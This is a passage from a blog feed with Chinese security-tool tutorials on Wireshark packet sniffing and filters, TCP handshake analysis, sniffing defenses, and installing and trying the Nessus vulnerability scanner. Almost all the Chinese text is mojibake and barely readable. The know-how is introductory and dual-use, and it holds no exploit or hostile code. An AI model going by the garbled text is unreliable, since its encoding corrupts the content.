é€’ç»™ä»–çš„æ•°æ®åŒ…ï¼Œä»è€Œå®ç°å—…æ¢ã€‚å—…æ¢å¾—åˆ°ç»“æœåï¼Œå†è¿›è¡Œç½‘ç»œåè®®åˆ†æï¼Œæ ¹æ®ç½‘ç»œåè®®åˆ†æçš„ç²’åº¦å¯ä»¥åˆ†ä¸ºä¸‰ç§ï¼šé’ˆå¯¹åŸå§‹æ•°æ®åŒ…è¿›è¡Œåˆ†æï¼Œå±‚æ¬¡æœ€ä½ã€æœ€ç»†ç²’åº¦ï¼›å¯¹ç½‘ç»œæµï¼ˆä¼šè¯ï¼‰è¿›è¡Œåˆ†æï¼Œé€šè¿‡5å…ƒç»„è¿›è¡Œæµï¼ˆä¼šè¯ï¼‰ï¼›ä»¥åŠç½‘ç»œæµé«˜å±‚ç»Ÿè®¡ã€‚é’ˆå¯¹ç½‘ç»œæŠ¥æ–‡åˆ†æçš„å·¥å…·ï¼Œå¸¸ç”¨çš„æœ‰é›†æˆå·¥å…·WireSharkï¼Œç½‘ç»œæµé‡ç»„å·¥å…·Nstreamsã€Snortï¼Œè¿›è¡Œé«˜å±‚ç»Ÿè®¡å’Œæ‘˜è¦åˆ†æçš„Netflowã€RRDToolsç­‰ç­‰ã€‚</p><h1 id="Wiresharkç®€ä»‹"><a href="#Wiresharkç®€ä»‹" class="headerlink" title="Wiresharkç®€ä»‹"></a>Wiresharkç®€ä»‹</h1><blockquote><p>ä½œä¸ºä¸€æ¬¾é«˜æ•ˆå…è´¹çš„æŠ“åŒ…å·¥å…·ï¼Œwiresharkå¯ä»¥æˆªå–å„ç§ç½‘ç»œå°åŒ…ï¼Œæ˜¾ç¤ºç½‘ç»œå°åŒ…çš„è¯¦ç»†ä¿¡æ¯ï¼Œå…¶æœ€å¤§çš„ä¼˜åŠ¿å°±æ˜¯å…è´¹ã€å¼€æºä»¥åŠå¤šå¹³å°æ”¯æŒï¼Œå¦‚ä»Šå…¶å·²æ˜¯å…¨çƒæœ€å¹¿æ³›çš„ç½‘ç»œæ•°æ®åŒ…åˆ†æè½¯ä»¶ä¹‹ä¸€ã€‚</p></blockquote><p>Wiresharkä¸å¯ä»¥åšä»€ä¹ˆï¼Ÿ</p><p>Wiresharkåªèƒ½æŸ¥çœ‹å°åŒ…ï¼Œè€Œä¸èƒ½ä¿®æ”¹å°åŒ…çš„å†…å®¹ï¼Œæˆ–è€…å‘é€å°åŒ…ã€‚ä¸”å¯¹äºç½‘ç»œä¸Šçš„å¼‚å¸¸æµé‡è¡Œä¸ºï¼ŒWiresharkä¸ä¼šäº§ç”Ÿè­¦ç¤ºæˆ–æ˜¯ä»»ä½•æç¤ºã€‚</p><h1 id="Wiresharkä½¿ç”¨"><a href="#Wiresharkä½¿ç”¨" class="headerlink" title="Wiresharkä½¿ç”¨"></a>Wiresharkä½¿ç”¨</h1><p>Wiresharkå®‰è£…</p><p>å‰å¾€<a href="https://www.wireshark.org/download.html">Wiresharkå®˜ç½‘</a>è¿›è¡Œä¸‹è½½ï¼Œä¸‹è½½å®Œæˆåä¸€è·¯nextå®‰è£…å³å¯ã€‚</p><p>ï¼ˆ1ï¼‰æ‰“å¼€wiresharkï¼Œä¸»ç•Œé¢å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304001621502.png" alt="image-20210304001621502"></p><p>ï¼ˆ2ï¼‰åˆ©ç”¨wiresharkå¼€å§‹æŠ“åŒ…ã€‚é€‰æ‹©èœå•æ ä¸Šæ•è·â€”â€”&gt;é€‰é¡¹ï¼Œåªå‹¾é€‰WLANçš„æ··æ‚æ¨¡å¼ï¼Œç‚¹å‡»å¼€å§‹(ä¹Ÿå¯ä»¥ç›´æ¥åŒå‡»ä¸Šå›¾çš„WLANå¼€å§‹)ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304001701812.png" alt="image-20210304001701812"></p><p>ï¼ˆ3ï¼‰æŸ¥çœ‹æŠ“åŒ…æƒ…å†µï¼ˆæ­¤æ—¶wiresharkæ­£ä¸åœåœ°æ•è·WLANä¸‹ä¼ è¾“çš„æ•°æ®åŒ…ï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304001722007.png" alt="image-20210304001722007"></p><p>ï¼ˆ4ï¼‰æ•°æ®åŒ…è¯¦ç»†ä¿¡æ¯</p><p>â€‹    å„è¡Œä¿¡æ¯åˆ†åˆ«ä¸º</p><ul><li>Frameï¼šç‰©ç†å±‚çš„æ•°æ®å¸§æ¦‚å†µ</li><li>Ethernet IIï¼š æ•°æ®é“¾è·¯å±‚ä»¥å¤ªç½‘å¸§å¤´éƒ¨ä¿¡æ¯</li><li>Internet Protocol Version 4: ç½‘ç»œå±‚IPåŒ…å¤´éƒ¨ä¿¡æ¯</li><li>Transmission Control Protocolï¼šä¼ è¾“å±‚çš„æ•°æ®æ®µå¤´éƒ¨ä¿¡æ¯</li><li>Hypertext Transfer Protocol: åº”ç”¨å±‚çš„ä¿¡æ¯ï¼Œæ­¤å¤„æ˜¯HTTPåè®®</li></ul><p>wiresharkä¸å¯¹åº”çš„OSIä¸ƒå±‚æ¨¡å‹</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304001821297.png" alt="image-20210304001821297"></p><p>wiresharkæ•è·åˆ°çš„TCPåŒ…ä¸­çš„æ¯ä¸ªå­—æ®µå†…å®¹</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304001914848.png" alt="image-20210304001914848"></p><p>ï¼ˆ5ï¼‰wiresharkè¿‡æ»¤å™¨</p><p>ç›´æ¥ä½¿ç”¨WireSharkæ•è·åŒ…å°†ä¼šå¾—åˆ°å¤§é‡çš„å†—ä½™ä¿¡æ¯ï¼Œåœ¨å‡ åƒç”šè‡³å‡ ä¸‡æ¡è®°å½•ä¸­å¾ˆéš¾æ‰¾åˆ°è‡ªå·±éœ€è¦çš„éƒ¨åˆ†ï¼Œå› è€Œï¼Œä½¿ç”¨è¿‡æ»¤å™¨ååˆ†é‡è¦ã€‚ä½¿ç”¨WireSharkçš„è¿‡æ»¤å™¨æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><p>ç¬¬ä¸€ç§æ˜¯åœ¨Capture Filterä¸­æŒ‰ç…§libpcapè¿‡æ»¤å™¨è¯­è¨€è®¾ç½®å¥½è¿‡æ»¤æ¡ä»¶ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ•è·åè¿‡æ»¤ã€‚å…ˆæ•è·æ‰€æœ‰çš„æ•°æ®åŒ…ï¼Œç„¶åé€šè¿‡è®¾å®šæ˜¾ç¤ºè¿‡æ»¤å™¨ï¼Œåªè®©Wiresharkæ˜¾ç¤ºæˆ‘ä»¬æƒ³è¦è§‚å¯Ÿçš„é‚£äº›ç±»å‹çš„æ•°æ®åŒ…ã€‚æˆ‘ä»¬ä½¿ç”¨WireSharkè¿‡æ»¤å™¨æ—¶ï¼Œè¾“å…¥è§„åˆ™è‹¥æ˜¯æ­£ç¡®çš„ï¼Œåˆ™è¿‡æ»¤å™¨è¾“å…¥æ¡†çš„èƒŒæ™¯ä¸ºç»¿è‰²ï¼Œå¦åˆ™ï¼ŒèƒŒæ™¯ä¸ºçº¢è‰²ã€‚</p><p>wiresharkè¿‡æ»¤å™¨è¡¨è¾¾å¼çš„è§„åˆ™ï¼š</p><ul><li>åè®®è¿‡æ»¤</li></ul><p>ç›´æ¥åœ¨æŠ“åŒ…è¿‡æ»¤æ¡†ä¸­ç›´æ¥è¾“å…¥åè®®åå³å¯ã€‚tcpï¼Œåªæ˜¾ç¤ºTCPåè®®çš„æ•°æ®åŒ…åˆ—è¡¨ï¼›httpï¼ŒåªæŸ¥çœ‹HTTPåè®®çš„æ•°æ®åŒ…åˆ—è¡¨ï¼›icmpï¼Œåªæ˜¾ç¤ºICMPåè®®çš„æ•°æ®åŒ…åˆ—è¡¨</p><ul><li>IPè¿‡æ»¤</li></ul><p>ip.src == 192.168.1.102ï¼Œæ˜¾ç¤ºæºåœ°å€ä¸º192.168.1.102çš„æ•°æ®åŒ…</p><p>ip.dst == 192.168.1.102ï¼Œæ˜¾ç¤ºç›®æ ‡åœ°å€ä¸º192.168.1.102çš„æ•°æ®åŒ…</p><p>ip.addr == 192.168.1.102ï¼Œæ˜¾ç¤ºæºIPåœ°å€æˆ–ç›®æ ‡IPåœ°å€ä¸º192.168.1.102çš„æ•°æ®åŒ…</p><ul><li>ç«¯å£è¿‡æ»¤</li></ul><p>tcp.port == 80ï¼Œæ˜¾ç¤ºtcpåè®®çš„æºä¸»æœºæˆ–è€…ç›®çš„ä¸»æœºç«¯å£ä¸º80çš„æ•°æ®åŒ…</p><p>tcp.srcport == 80ï¼Œæ˜¾ç¤ºTCPåè®®çš„æºä¸»æœºç«¯å£ä¸º80çš„æ•°æ®åŒ…</p><p>tcp.dstport == 80ï¼Œæ˜¾ç¤ºTCPåè®®çš„ç›®çš„ä¸»æœºç«¯å£ä¸º80çš„æ•°æ®åŒ…</p><ul><li>Httpæ¨¡å¼è¿‡æ»¤</li></ul><p>http.request.method == GET, åªæ˜¾ç¤ºHTTPåè®®ä¸‹GETè¯·æ±‚çš„æ•°æ®åŒ…</p><p>http.request.method == POST,åªæ˜¾ç¤ºHTTPåè®®ä¸‹POSTè¯·æ±‚çš„æ•°æ®åŒ…</p><ul><li>é€»è¾‘è¿ç®—ç¬¦</li></ul><p>è¿‡æ»¤å¤šä¸ªæ¡ä»¶ç»„åˆæ—¶ï¼Œä½¿ç”¨and/orã€‚æ¯”å¦‚è·å–IPåœ°å€ä¸º192.168.1.104çš„ICMPæ•°æ®åŒ…è¡¨è¾¾å¼ä¸ºip.addr == 192.168.1.104 and icmp</p><h1 id="Wiresharkåˆ†æTCPä¸‰æ¬¡æ¡æ‰‹"><a href="#Wiresharkåˆ†æTCPä¸‰æ¬¡æ¡æ‰‹" class="headerlink" title="Wiresharkåˆ†æTCPä¸‰æ¬¡æ¡æ‰‹"></a>Wiresharkåˆ†æTCPä¸‰æ¬¡æ¡æ‰‹</h1><p>TCPä¸‰æ¬¡æ¡æ‰‹</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304002058972.png" alt="image-20210304002058972"></p><p>æŠ“å–TCPåŒ…</p><p>å¯åŠ¨wiresharkï¼Œæ‰“å¼€æµè§ˆå™¨è¾“å…¥<a href="http://www.baidu.com/">www.baidu.com</a>ï¼›</p><p>ç»ˆæ­¢æŠ“åŒ…ï¼Œåœ¨è¿‡æ»¤æ è¾“å…¥httpä»¥è¿‡æ»¤éšè—å…¶ä»–æ— å…³æ•°æ®åŒ…ï¼›</p><p>å³é”®é€‰ä¸­ï¼Œç‚¹å‡»è¿½è¸ªæµâ€”â€”&gt;TCPæµï¼Œ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304002136211.png" alt="image-20210304002136211"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæˆªè·äº†ä¸‰ä¸ªTCPæ¡æ‰‹æ•°æ®åŒ…ï¼Œç¬¬å››ä¸ªæ˜¯HTTPæ•°æ®åŒ…ï¼Œè¯´æ˜HTTPçš„ç¡®æ˜¯ä½¿ç”¨TCPå»ºç«‹è¿æ¥çš„ã€‚</p><blockquote><p>ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€äº†ä¸€ä¸ªTCPè¿æ¥è¯·æ±‚ï¼Œæ ‡å¿—ä½SYN = 1ï¼Œå®¢æˆ·ç«¯åºå·Seq(Sequence number)ä¸ºx = 0ï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯è¯·æ±‚å»ºç«‹è¿æ¥</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304002219815.png" alt="image-20210304002219815"></p><blockquote><p>ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼ŒæœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘å›ä¸€ä¸ªç¡®è®¤åŒ…,æ ‡å¿—ä½SYN = 1,ACK = 1ã€‚æœåŠ¡å™¨åºå·seq(y)=0ï¼Œå°†ç¡®è®¤åºå·ack(Acknowledgement Number)è®¾ç½®ä¸ºå®¢æˆ·ç«¯åºå·seq(x)åŠ 1,å³0+1=1ã€‚</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304002240963.png" alt="image-20210304002240963"></p><blockquote><p>ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼Œå®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨å‘æ¥çš„åŒ…åæ£€æŸ¥ç¡®è®¤åºå·æ˜¯å¦æ­£ç¡®ï¼Œå³ç¬¬ä¸€æ¬¡å‘é€çš„åºå·seqæ˜¯å¦åŠ 1ï¼ˆX+1= 0+1=1ï¼‰ä»¥åŠæ ‡å¿—ä½ACKæ˜¯å¦ä¸º1ã€‚è‹¥æ­£ç¡®ï¼Œå®¢æˆ·ç«¯ä¼šå†å‘æœåŠ¡å™¨ç«¯å‘é€ä¸€ä¸ªæ•°æ®åŒ…ï¼Œæ ‡å¿—ä½ACK=1ï¼Œç¡®è®¤åºå·=Y+1=0+1=1ï¼Œå¹¶ä¸”æŠŠæœåŠ¡å™¨å‘æ¥çš„åºå·seqåŠ 1å‘é€ç»™å¯¹æ–¹ï¼Œå‘é€åºå·seqä¸ºX+1= 0+1=1ã€‚æœåŠ¡å™¨æ”¶åˆ°åç¡®è®¤åºå·å€¼ä¸ACK=1ã€‚è‡³æ­¤ï¼Œä¸€æ¬¡TCPè¿æ¥å»ºç«‹ï¼Œå¯ä»¥ä¼ é€æ•°æ®äº†ã€‚</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304002304859.png" alt="image-20210304002304859"></p><h1 id="ç½‘ç»œå—…æ¢çš„é˜²èŒƒ"><a href="#ç½‘ç»œå—…æ¢çš„é˜²èŒƒ" class="headerlink" title="ç½‘ç»œå—…æ¢çš„é˜²èŒƒ"></a>ç½‘ç»œå—…æ¢çš„é˜²èŒƒ</h1><p>ç½‘ç»œå—…æ¢å¯¹äºå®‰å…¨é˜²æŠ¤ä¸€èˆ¬çš„ç½‘ç»œæ¥è¯´ï¼Œæ“ä½œç®€å•ä½†åŒæ—¶å¨èƒå·¨å¤§ï¼Œå¾ˆå¤šæ”»å‡»è€…ä½¿ç”¨å—…æ¢å™¨è¿›è¡Œç½‘ç»œå…¥ä¾µçš„æ¸—é€ã€‚æ•…é˜²èŒƒç½‘ç»œå—…æ¢æ˜¾å¾—å°¤ä¸ºé‡è¦ï¼Œå¯ä»¥é‡‡ç”¨ä»¥ä¸‹é˜²å¾¡æªæ–½ï¼š</p><ul><li>å®‰å…¨çš„æ‹“æ‰‘ç»“æ„ã€‚å—…æ¢å™¨åªèƒ½åœ¨å½“å‰ç½‘ç»œæ®µä¸Šè¿›è¡Œæ•°æ®æ•è·ã€‚è¿™å°±æ„å‘³ç€ï¼Œå°†ç½‘ç»œåˆ†æ®µå·¥ä½œè¿›è¡Œå¾—è¶Šç»†ï¼Œå—…æ¢å™¨èƒ½å¤Ÿæ”¶é›†çš„ä¿¡æ¯å°±è¶Šå°‘ã€‚ä½†æ˜¯ï¼Œé™¤éæ˜¯ä¸€ä¸ªISPï¼ˆåˆ†å±‚æœåŠ¡æä¾›å•†ï¼‰ï¼Œæˆ–è€…èµ„æºç›¸å¯¹ä¸å—é™åˆ¶ï¼Œå¦åˆ™è¿™æ ·çš„è§£å†³æ–¹æ¡ˆéœ€è¦å¾ˆå¤§çš„ä»£ä»·ã€‚</li><li>ä¼šè¯åŠ å¯†ã€‚ä¼ ç»Ÿçš„ç½‘ç»œæœåŠ¡ç¨‹åºï¼ŒHTTPã€FTPã€SMTPå’ŒTelnetç­‰åœ¨æœ¬è´¨ä¸Šéƒ½æ˜¯ä¸å®‰å…¨çš„ï¼Œå› ä¸ºå®ƒä»¬åœ¨ç½‘ç»œä¸Šç”¨æ˜æ–‡ä¼ é€å£ä»¤å’Œæ•°æ®ï¼Œå—…æ¢å™¨éå¸¸å®¹æ˜“å°±å¯ä»¥æˆªè·è¿™äº›ä¿¡æ¯ã€‚ä½¿ç”¨SSH(secure shell)ç­‰åè®®å¯ä»¥ä½¿å¾—ä¿¡æ¯å®‰å…¨åœ°ä¼ è¾“ã€‚é€šè¿‡ä½¿ç”¨SSHï¼Œå¯ä»¥æŠŠæ‰€æœ‰ä¼ è¾“çš„æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œè¿™æ ·â€ä¸­é—´æœåŠ¡å™¨â€è¿™ç§æ”»å‡»æ–¹å¼å°±ä¸å¯èƒ½å®ç°äº†ï¼Œè€Œä¸”ä¹Ÿèƒ½å¤Ÿé˜²æ­¢DNSå’ŒIPæ¬ºéª—ã€‚</li></ul><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://zhuanlan.zhihu.com/p/82498482">WiresharkæŠ“åŒ…ä½¿ç”¨æŒ‡å—</a></p><p>[2] <a href="https://www.cnblogs.com/cocowool/p/wireshark_tcp_http.html">Wiresharkä½¿ç”¨å…¥é—¨</a></p><p>[3] <a href="https://www.cnblogs.com/TankXiao/archive/2012/10/10/2711777.html">WiresharkåŸºæœ¬ä»‹ç»å’Œå­¦ä¹ TCPä¸‰æ¬¡æ¡æ‰‹</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
            <tag> Wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»€ä¹ˆï¼ŒNessusåˆåŒå’å•å®‰è£…å¤±è´¥äº†ï¼Ÿ</title>
      <link href="posts/52081.html"/>
      <url>posts/52081.html</url>
      
        <content type="html"><![CDATA[<h1 id="Nessusç®€ä»‹"><a href="#Nessusç®€ä»‹" class="headerlink" title="Nessusç®€ä»‹"></a>Nessusç®€ä»‹</h1><blockquote><p>Nessus æ˜¯ç›®å‰å…¨ä¸–ç•Œæœ€å¤šäººä½¿ç”¨çš„ç³»ç»Ÿæ¼æ´æ‰«æä¸åˆ†æè½¯ä»¶ã€‚æ€»å…±æœ‰è¶…è¿‡75,000ä¸ªæœºæ„ä½¿ç”¨Nessus ä½œä¸ºæ‰«æè¯¥æœºæ„ç”µè„‘ç³»ç»Ÿçš„è½¯ä»¶ï¼Œä¸”æä¾›å®Œæ•´çš„ç”µè„‘æ¼æ´æ‰«ææœåŠ¡, å¹¶éšæ—¶æ›´æ–°å…¶æ¼æ´æ•°æ®åº“ã€‚</p></blockquote><h1 id="NessusåŸç†"><a href="#NessusåŸç†" class="headerlink" title="NessusåŸç†"></a>NessusåŸç†</h1><blockquote><p>Nessusæ˜¯ä¸€ç§å…¸å‹çš„åŸºäºå®¢æˆ·/æœåŠ¡å™¨ç»“æ„çš„ç½‘ç»œæ‰«æç³»ç»Ÿã€‚å®¢æˆ·ç«¯åŒ…æ‹¬ç”¨æˆ·é…ç½®å·¥å…·å’Œç»“æœå­˜å‚¨/æŠ¥å‘Šç”Ÿæˆå·¥å…·ã€‚æœåŠ¡å™¨ç«¯åŒ…æ‹¬ä¸€ä¸ªæ‰«ææ–¹æ³•åº“(ç”±æ’ä»¶ç»„æˆ)ã€å½“å‰æ´»åŠ¨æ‰«æçŸ¥è¯†åº“å’Œä¸€ä¸ªæ‰«æå¼•æ“ã€‚Nessusçš„æ‰«ææ–¹æ³•é‡‡ç”¨çš„æ˜¯æ’ä»¶æŠ€æœ¯ã€‚æ’ä»¶æ˜¯ç”¨è„šæœ¬è¯­è¨€ç¼–å†™çš„å­è¿›ç¨‹ï¼Œé€šå¸¸ç³»ç»Ÿå…ˆåˆ¶å®šæ‰«æç­–ç•¥ï¼Œç„¶åæ‰«æè¿›ç¨‹æ ¹æ®ç­–ç•¥è°ƒç”¨ä¸€ç³»åˆ—æ’ä»¶æ¥æ‰§è¡Œæ¼æ´æ‰«æï¼Œæ£€æµ‹å‡ºç³»ç»Ÿä¸­å­˜åœ¨çš„ä¸€ä¸ªæˆ–å¤šä¸ªæ¼æ´ã€‚é€šå¸¸ä¸€ä¸ªæ’ä»¶è´Ÿè´£æ‰«æä¸€ä¸ªæˆ–ä¸€ç±»æ¼æ´ã€‚</p></blockquote><h1 id="Nessuså®‰è£…"><a href="#Nessuså®‰è£…" class="headerlink" title="Nessuså®‰è£…"></a>Nessuså®‰è£…</h1><h2 id="Windowsä¸‹å®‰è£…"><a href="#Windowsä¸‹å®‰è£…" class="headerlink" title="Windowsä¸‹å®‰è£…"></a>Windowsä¸‹å®‰è£…</h2><p>å‰å¾€<a href="https://www.tenable.com/downloads/nessus?loginAttempted=true">å®˜ç½‘</a>ä¸‹è½½ç›¸åº”å®‰è£…åŒ…</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302191336035.png" alt="image-20210302191336035"></p><p>å¯åŠ¨å®‰è£…ç¨‹åºï¼Œä¸‹ä¸€æ­¥å®‰è£…å³å¯</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302191556933.png" alt="image-20210302191556933"></p><p>å®‰è£…å®Œæˆï¼Œè‡ªåŠ¨æ‰“å¼€Nessus</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302192055072.png" alt="image-20210302192055072"></p><p>è‹¥æœªæˆåŠŸæ‰“å¼€Nessus,å¯æ‰‹åŠ¨æ‰¾åˆ°<code>Nessus Web Client</code> ç¨‹åºæˆ–åœ¨æµè§ˆå™¨ä¸­ç›´æ¥è®¿é—® <code>https://localhost:8834</code> </p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302192658843.png" alt="image-20210302192658843"></p><p>è·å–æ¿€æ´»ç ï¼ˆé‚®ç®±ä¸€å®šå†™æ­£ç¡®ï¼Œå¦åˆ™æ”¶ä¸åˆ°æ¿€æ´»ç ï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302192840744.png" alt="image-20210302192840744"></p><p>è¾“å…¥æ¿€æ´»ç ï¼ˆä»é‚®ç®±ä¸­å¤åˆ¶è¿‡å»å³å¯ï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302192902655.png" alt="image-20210302192902655"></p><p>æ³¨å†Œä¸€ä¸ªè´¦æˆ·ï¼Œè®¾ç½®ç”¨æˆ·åå’Œå¯†ç ï¼ŒSubmit</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302192924048.png" alt="image-20210302192924048"></p><p>â€œè€å¿ƒâ€ç­‰å¾…å…¶ä¸‹è½½æ’ä»¶ï¼ˆæ³¨æ„ï¼Œé€‰æ‹©ä¸€ä¸ªç½‘é€Ÿå¥½çš„åœ°æ–¹èƒ½çœå¿ƒä¸å°‘ï¼Œå‰äººä¹‹é‰´ï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302192940477.png" alt="image-20210302192940477"></p><blockquote><p>è‹¥ç¬¬ä¸€æ¬¡ä¸‹è½½æ’ä»¶å¤±è´¥ï¼Œæƒ³è¦é‡æ–°ä¸‹è½½ï¼Œå¯å‚è€ƒè¿™ç¯‡æ–‡ç« çš„æ­¥éª¤ï¼Œå½“ç„¶ä¹Ÿå¯åˆ é™¤Nessusç¨‹åºï¼Œé‡æ–°å®‰è£…</p><p><a href="https://blog.csdn.net/zhiwule1314/article/details/89673413">https://blog.csdn.net/zhiwule1314/article/details/89673413</a></p></blockquote><p>ç­‰å¾…å…¶æ’ä»¶ç¼–è¯‘</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193001937.png" alt="image-20210302193001937"></p><p>ç­‰å¾…ç»“æŸï¼ŒWelcome to Nessus!</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193022088.png" alt="image-20210302193022088"></p><hr><h2 id="Kaliä¸‹å®‰è£…"><a href="#Kaliä¸‹å®‰è£…" class="headerlink" title="Kaliä¸‹å®‰è£…"></a>Kaliä¸‹å®‰è£…</h2><p>åŒæ ·ï¼Œå‰å¾€<a href="https://www.tenable.com/downloads/nessus?loginAttempted=true">å®˜ç½‘</a>ä¸‹è½½å¯¹åº”å®‰è£…åŒ…</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193444469.png" alt="image-20210302193444469"></p><p>å°†ä¸‹è½½å¥½çš„å®‰è£…åŒ…æ‹–åˆ°kaliä¸­</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193505044.png" alt="image-20210302193505044"></p><p>å®‰è£…Nessus </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i Nessus-8.13.1-debian6_amd64.deb</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193536170.png" alt="image-20210302193536170"></p><p>å¯åŠ¨Nessus</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start nessusd.service</span><br></pre></td></tr></table></figure><p>æˆ–è€…åœ¨æµè§ˆå™¨ä¸­è®¿é—®<a href="https://kali:8834/">https://kali:8834/</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193554369.png" alt="image-20210302193554369"></p><p>è·å–æ¿€æ´»ç åŠåé¢çš„æ­¥éª¤ä¸Windowsä¸‹ä¸€è‡´ï¼Œä¸å†èµ˜è¿°ã€‚</p><h1 id="Nessusè¯•ç”¨"><a href="#Nessusè¯•ç”¨" class="headerlink" title="Nessusè¯•ç”¨"></a>Nessusè¯•ç”¨</h1><p>è®¾ç½®ç›®æ ‡ç½‘ç«™ä¿¡æ¯</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193135172.png" alt="image-20210302193135172"></p><p>å¼€å§‹æ‰«æ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193157505.png" alt="image-20210302193157505"></p><p>â€¦â€¦</p><p>æŸ¥çœ‹æ‰«æç»“æœ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193224984.png" alt="image-20210302193224984"></p><p>æŸ¥çœ‹æ‰«æç»“æœè¯¦æƒ…</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193242367.png" alt="image-20210302193242367"></p><blockquote><p>æ›´å¤šNessuså†…å®¹å¾…ä½ æ¢ç´¢ï¼</p></blockquote><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://www.dazhuanlan.com/2019/12/08/5ded08a6b8607/?__cf_chl_jschl_tk__=7fbdcf6395defa239d39d224785fa24f35dd1213-1614649002-0-Actq3WOG98yd3rQzAtLvwzCawdh-KtGGWn9fpLFQIt92ZLlMlzOtRXmmfUqosikbBTCuYGB95nLRJ1EHIC2llM-PECWZ3mf0Sf0LwHCK7x2ObFJ2fWsKTFrna8hz8p5zb4YPw1PZSmbA2-YlM0jWhsELAhCvs1Qcj1o-i83tFu69pnkwVSFlWnpxLHyE4-0Pp7wLANxyU1StBiOR5agpKj-dkqLzomIb5n1kEYU-Si3NdEjqjNJcseQocDpqysxMpdF6wPexyBRNDE5NaJGhdO7O7WQ4w27vF1hONSpNGheArAOJgaIY1JvXG9Ayq3G7ihua-VJY1WvTicXBfuykv8E">nessusåŸç†</a></p><p>[2] <a href="https://blog.csdn.net/wwl012345/article/details/96998187">æ¸—é€æµ‹è¯•æŠ€æœ¯â€”-å·¥å…·ä½¿ç”¨(äºŒ)â€“Nessuså·¥å…·ä¸‹è½½åŠä½¿ç”¨(å®‰è£…åœ¨Kaliä¸Š)</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
            <tag> Nessus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Cç¼–ç¨‹å®æˆ˜ä¹‹ç½‘ç»œç¼–ç¨‹å­¦ä¹ è®°å½•</title>
      <link href="posts/19674.html"/>
      <url>posts/19674.html</url>
      
